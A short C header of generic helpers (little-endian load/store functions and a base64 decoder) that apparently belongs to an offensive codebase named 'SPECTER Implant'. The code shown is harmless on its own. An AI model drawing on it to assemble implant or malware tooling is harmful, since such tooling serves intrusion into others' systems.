/**
 * SPECTER Implant — Shared Utility Helpers
 *
 * Common little-endian load/store and base64 primitives used across
 * multiple compilation units.  Defined as static inline so the unity
 * build sees exactly one definition per symbol.
 */

#ifndef UTIL_H
#define UTIL_H

#include "specter.h"

/* ------------------------------------------------------------------ */
/*  Little-endian load / store                                         */
/* ------------------------------------------------------------------ */

static inline DWORD load32_le(const BYTE *p) {
    return (DWORD)p[0]       | ((DWORD)p[1] << 8) |
           ((DWORD)p[2] << 16) | ((DWORD)p[3] << 24);
}

static inline void store32_le(BYTE *p, DWORD v) {
    p[0] = (BYTE)(v);
    p[1] = (BYTE)(v >> 8);
    p[2] = (BYTE)(v >> 16);
    p[3] = (BYTE)(v >> 24);
}

static inline QWORD load64_le(const BYTE *p) {
    return (QWORD)load32_le(p) | ((QWORD)load32_le(p + 4) << 32);
}

static inline void store64_le(BYTE *p, QWORD v) {
    store32_le(p, (DWORD)v);
    store32_le(p + 4, (DWORD)(v >> 32));
}

/* ------------------------------------------------------------------ */
/*  Base64 (standard alphabet, with padding)                           */
/* ------------------------------------------------------------------ */

static const char util_b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Decode a single base64 character.
 * Returns 0-63 on success, -1 on invalid/padding.
 */
static inline int util_b64_decode_char(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

#endif /* UTIL_H */
